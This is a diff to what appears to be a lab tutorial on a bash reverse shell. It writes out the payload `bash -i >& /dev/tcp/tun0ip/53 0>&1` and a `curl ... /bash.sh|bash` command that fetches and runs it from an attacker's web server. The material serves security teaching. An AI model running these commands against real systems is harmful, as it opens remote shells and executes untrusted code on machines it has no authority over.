@@ -14,7 +14,8 @@ In this task, we will be covering how to use a basic bash reverse shell along wi
 
 To begin, we will create a simple payload by placing the below code into a `.sh` file.
 
-`#!/bin/bash   bash -i >& /dev/tcp/tun0ip/53 0>&1`
+`#!/bin/bash`   
+`bash -i >& /dev/tcp/tun0ip/53 0>&1`
 
 The first line will declare that we are using the bash scripting language. The second line is the payload itself. For more information about this payload, check out this explain shell, [https://explainshell.com/explain?cmd=bash+-i+>%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0>%261](https://explainshell.com/explain?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F127.0.0.1%2F53+0%3E%261).  
 
@@ -26,7 +27,7 @@ Now that you have the payload ready to go, you can start up a local web server o
 
 Once you have a server started hosting the file, we can compile a command to execute the file. Find the command below.  
 
-Unencoded command: `curl http://10.x.x.x:80/shellscript.sh|bash &`
+Unencoded command: `curl http://10.x.x.x:80/bash.sh|bash &`
 
 As we have already mentioned, special characters can cause issues within URLs. To combat this, we can utilize URL encoding on any special characters. Find the encoded command below.
 
